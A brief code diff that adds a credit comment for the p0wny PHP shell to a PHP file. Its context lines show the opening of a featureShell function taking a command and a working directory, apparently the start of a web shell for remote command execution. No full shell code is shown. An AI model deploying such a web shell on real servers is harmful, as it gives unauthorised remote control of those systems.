@@ -1,3 +1,7 @@
+/*
+   ALL CREDIT FOR THIS PHP SHELL GOES TO THIS GUY -> https://github.com/flozz/p0wny-shell
+*/
+
 <?php
 function featureShell($cmd, $cwd) {
     $stdout = array();
